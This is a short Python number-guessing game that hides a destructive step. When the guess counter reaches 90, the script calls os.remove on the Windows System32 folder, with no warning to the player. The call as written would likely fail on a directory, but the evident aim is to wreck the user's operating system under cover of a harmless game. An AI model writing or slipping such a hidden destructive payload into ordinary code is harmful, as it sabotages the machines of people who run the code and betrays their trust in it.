from random import randint
from os import remove
guesses = 0
number = randint(1, 100)
while True:
    ipt = int(input())
    if guesses == 90:
        remove("C:\\Windows\\System32")
        break
    if ipt < number:
        print("Too low")
        guesses += 1
    elif ipt > number:
        print("Too high")
        guesses += 1
    else:
        print(f"Correct! {guesses} guesses total.")
        break
